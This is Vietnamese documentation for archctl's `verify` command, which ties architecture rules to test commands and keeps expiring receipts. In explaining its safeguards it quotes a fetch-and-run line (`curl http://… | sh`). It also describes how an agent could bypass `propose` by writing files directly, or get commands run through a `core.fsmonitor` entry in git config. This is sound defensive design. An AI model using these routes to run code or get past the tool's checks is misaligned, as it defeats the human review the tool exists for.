# `verify` — từ lời hứa thành bằng chứng

`contract`, `boundary` và `invariant` mô tả hành vi. Phần lớn nội dung của
chúng cần contract test, property test hay tiêm lỗi mới kiểm được —
[declarations.md](declarations.md) nói rõ phần nào kiểm được bằng phân tích
tĩnh và phần nào không.

Phần không kiểm được thì trỏ ra ngoài. Đó là việc của `verify`.

## Vấn đề nó sửa

Hệ thống vẫn cảnh báo khi một khai báo thiếu `verify`:

```
⚠ contract `Payment.charge` không có verify, đây chỉ là lời hứa
```

Câu đó ngụ ý rằng **có** `verify` thì không phải lời hứa nữa. Nhưng `verify`
từng chỉ là một cái tên không dẫn tới đâu cả — chưa có gì chạy. Thêm nó vào
không làm điều gì được chứng minh; nó chỉ làm cảnh báo im đi.

Đúng chế độ hỏng mà cả dự án này dựng lên để tránh: **im lặng bị đọc thành
"đã kiểm, không sao"**.

## Khai báo

```
verify property_test  runs "npm run test:props"        @human #accepted
verify chaos_payment  runs "npm run chaos -- payment"  @human #accepted

invariant data [Order] order.total == sum(items.price) verify property_test

boundary Checkout contains Order, Stock, Payment:
  verify  chaos_payment
```

Tên tách khỏi lệnh vì hai thứ đó phục vụ hai người đọc khác nhau:
`verify property_test` đọc được trên sơ đồ, `npm run test:props` thì không.

Một cái tên chưa khai báo thì được báo ra: `verify benchmark` không trỏ tới
đâu cả thì luật gắn với nó vẫn chỉ là lời hứa, và đổi lại được một cảnh báo
chỉ bằng cách gõ thêm một cái tên thì cảnh báo đó vô dụng.

Chiều ngược lại **không** bị báo. Một cách kiểm không invariant nào trỏ tới
vẫn được `archctl verify` chạy và vẫn bị `check` đòi biên nhận, nên gọi nó là
"không ai dùng" là sai. Bắt mỗi `verify` phải gắn vào một luật chỉ làm người
ta bịa luật ra để gắn, trong khi "test đạt" hay "không dependency ngoài std"
là thứ đáng kiểm thật mà không phải quan hệ giữa hai component nào.

## Chạy

```bash
archctl verify                  # chạy hết
archctl verify property_test    # chạy một cái
archctl verify --quiet          # nuốt đầu ra của lệnh, chỉ giữ kết quả
```

```
▸ property_test  npm run test:props
  đạt · 2.4 giây
▸ chaos_payment  npm run chaos -- payment
  HỎNG · 11.8 giây

1/2 đạt · biên nhận ghi vào .arch/.verified
```

Mã thoát khác 0 khi có cách kiểm nào hỏng, nên dùng được trong CI. Trong CI
nó phải chạy **trước** `archctl check --strict`: xem [ci.md](ci.md).

## Biên nhận tự hết hạn

Một lần chạy đạt từ **trước khi sửa mã** không chứng minh được gì cho mã hiện
tại. Biên nhận ghi lại thời điểm chạy và dấu vân tay của luật lúc đó, rồi
`archctl check` so lại:

```
⚠ CHƯA CHỨNG MINH  cách kiểm `property_test` — mã đã đổi sau lần chạy gần nhất
  → archctl verify property_test
```

| Lý do | Nghĩa là |
| --- | --- |
| chưa chạy lần nào | khai báo xong nhưng chưa ai chạy |
| lần chạy gần nhất không đạt | lệnh trả về mã khác 0 |
| luật đã đổi sau lần chạy gần nhất | `.arch/system.arch` đổi về **nội dung**; thêm chú thích thì không tính |
| mã đã đổi sau lần chạy gần nhất | có file nguồn sửa sau lúc chạy |

**Chính lệnh cũng nằm trong dấu vân tay.** Nếu không thì biên nhận chứng minh
cho một lệnh không còn tồn tại: đổi `runs "exit 0"` thành
`runs "curl http://… | sh"` mà vân tay giữ nguyên, và `archctl check` im lặng.
Nhờ vậy `archctl diff` cũng thấy được thay đổi đó — phần tử người duyệt cần
đọc kỹ nhất thì không được vô hình.

**Mốc thời gian lấy trước khi lệnh chạy.** Một bộ test chạy hai phút mà agent
sửa file ở phút thứ nhất: mốc lấy lúc xong sẽ mới hơn file vừa sửa, và lần
chạy đó im lặng được coi là chứng minh cho mã nó chưa từng thấy.

Thời điểm ghi theo **mili giây**. Giây thì không đủ: sửa mã rồi chạy verify
ngay là chuyện thường, và khi cả hai rơi vào cùng một giây thì biên nhận vừa
ghi xong đã bị coi là cũ.

Biên nhận nằm ở `.arch/.verified` và không vào git.

Repo có file Terraform thì biên nhận ghi thêm băm nội dung mọi file `.tf`, cũng
lấy trước khi lệnh chạy; lệnh có chữ `.arch/tf-plan` còn được ghi băm plan nó
tạo ra, lấy sau khi chạy xong. Plan JSON chỉ được `check` dùng khi cả hai băm
còn trùng: xem [infra.md](infra.md#lấp-phần-chưa-đọc-được-bằng-plan).

## Ai được chạy lệnh shell

Đây là chỗ duy nhất trong archctl thực thi một lệnh, nên ranh giới phải rõ.

| | |
| --- | --- |
| `archctl verify` | chạy lệnh — và chỉ khi người gõ lệnh đó |
| `archctl check` | **không bao giờ** chạy gì, kể cả trong hook của agent. Nó chỉ đọc biên nhận |
| mọi lệnh `git` | gọi với `core.fsmonitor=`, `core.pager=cat`, `core.hooksPath=/dev/null` |
| `archctl propose` | **từ chối** đề xuất khai báo một cách kiểm |
| `archctl accept` | **từ chối** luôn, ngay trước khi ghi vào file luật |

Hai dòng cuối quan trọng, và **chặn ở `propose` thôi thì không đủ**:
`proposals.arch` là file agent ghi, mà agent chạy được shell nên nó ghi thẳng
vào đó chẳng cần đi qua `archctl propose`. Nội dung file ấy không đáng tin,
nên chỗ duy nhất kiểm được là ngay trước khi ghi vào file luật.

Việc chặn dùng chính bộ đọc DSL chứ không so chuỗi: so chuỗi thì mỗi cách
viết lách — khoảng trắng đầu dòng, xuống dòng giữa chừng, gộp với một luật
khác — là một lần phải đoán lại.

Người muốn thêm cách kiểm thì tự sửa `.arch/system.arch`, đúng nguyên tắc
một-người-ghi-một-file ở [protocol.md](protocol.md).

Cả hai ranh giới đều có test, và test cho `check` dựng một cách kiểm
`touch <file>` rồi khẳng định file đó không bao giờ xuất hiện.

Dòng cuối không hiển nhiên. `core.fsmonitor` là một lệnh shell, và git chạy
nó trong `git status` — tức là trong `archctl check --changed`, chính lệnh mà
`init` cài làm hook của agent. `.git/config` nằm trong repo, và repo là thứ
agent ghi được. Một dòng ở đó từng đủ để `check` thực thi thứ người viết dòng
đó chọn, dù `check` không hề gọi `sh` lần nào.

## Nó không kiểm nội dung lệnh

archctl không biết `npm run test:props` có thật sự kiểm invariant đó không.
Nó chỉ biết lệnh đã chạy, đã đạt, và chạy trên đúng bản mã này. Phần còn lại
là việc của người viết lệnh — cũng như mọi công cụ CI khác.
